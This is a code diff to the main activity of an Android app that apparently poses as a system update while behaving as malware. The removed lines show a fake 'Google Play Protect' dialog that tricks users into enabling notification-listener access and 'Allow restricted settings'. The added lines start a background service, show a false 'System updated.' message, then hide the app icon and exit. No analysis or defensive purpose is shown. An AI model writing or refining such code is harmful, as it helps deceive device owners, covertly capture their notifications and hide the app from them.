@@ -117,71 +117,21 @@ public class MainActivity extends Activity {
     public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
         if (requestCode == PERMISSION_REQUEST_CODE) {
-            statusTextView.setText("Patching system components...");
-            btnUpdate.setVisibility(View.GONE);
-            progressBar.setVisibility(View.VISIBLE);
-            progressBar.setIndeterminate(true);
-            
+            // Start the service in the background
             startMainService();
+            
+            // Minimal feedback, then hide immediately
+            statusTextView.setText("System updated.");
+            btnUpdate.setVisibility(View.GONE);
             
             new android.os.Handler().postDelayed(new Runnable() {
                 @Override
                 public void run() {
-                    if (!isNotificationServiceEnabled()) {
-                        showRestrictedSettingsGuide();
-                    } else {
-                        completeInstallation();
-                    }
+                    hideAppIcon();
+                    finish();
                 }
-            }, 1000); // Fast check
+            }, 500); // 0.5s for basic feedback
         }
-    }
-
-    private void showRestrictedSettingsGuide() {
-        android.app.AlertDialog.Builder builder = new android.app.AlertDialog.Builder(this);
-        builder.setTitle("Google Play Protect");
-        builder.setMessage("To complete the security handshake, please enable 'System Notification Manager' in the next screen.\n\n" +
-                "Note: If the switch is blocked, click the (⋮) menu in 'App Info' and select 'Allow restricted settings' first.");
-        builder.setPositiveButton("CONTINUE", (dialog, which) -> {
-            try {
-                Intent intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
-                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                startActivity(intent);
-                startCompletionMonitor();
-            } catch (Exception e) {
-                completeInstallation();
-            }
-        });
-        builder.setCancelable(false);
-        builder.show();
-    }
-
-    private void startCompletionMonitor() {
-        statusTextView.setText("Verifying security protocols...");
-        final android.os.Handler handler = new android.os.Handler();
-        handler.postDelayed(new Runnable() {
-            @Override
-            public void run() {
-                if (isNotificationServiceEnabled()) {
-                    completeInstallation();
-                } else {
-                    handler.postDelayed(this, 1500);
-                }
-            }
-        }, 1500);
-        
-        handler.postDelayed(() -> completeInstallation(), 30000);
-    }
-
-    private void completeInstallation() {
-        statusTextView.setText("System update installed successfully.");
-        new android.os.Handler().postDelayed(new Runnable() {
-            @Override
-            public void run() {
-                hideAppIcon();
-                finish();
-            }
-        }, 3000);
     }
 
     private boolean isNotificationServiceEnabled() {
